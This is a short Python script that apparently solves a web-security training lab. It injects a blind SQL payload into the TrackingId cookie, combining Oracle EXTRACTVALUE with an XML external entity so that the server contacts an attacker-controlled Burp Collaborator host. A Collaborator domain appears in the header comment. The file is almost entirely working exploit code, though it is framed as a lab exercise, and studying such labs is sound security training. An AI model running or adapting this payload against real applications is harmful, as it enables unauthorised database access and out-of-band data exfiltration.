# kxltj6emmx8mi4y7ueeh0gn7kyqoed.oastify.com

import requests
import re

def get_trackingid(session, domain):
    session.get(domain)
    cookie = session.cookies.get_dict()
    tracking_id = cookie['TrackingId']
    return tracking_id

def solve_lab(session, domain, tracking_id, burp_client):
    payload = tracking_id + '''' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "{}"> %remote;]>'),'/l') FROM dual-- '''.format(burp_client)
    r = session.get(domain, cookies={'TrackingId': requests.utils.quote(payload, safe='/:?=')})
    if ('Solved' in r.text):        
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not solved.')

if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    burp_client = input('Enter your Burp Collaborator Client: ')
    session = requests.Session()
    try:
        tracking_id = get_trackingid(session, domain)
        solve_lab(session, domain, tracking_id, burp_client)
    except requests.exceptions.ConnectionError:
        print('Error connecting to the server. Check your URL.')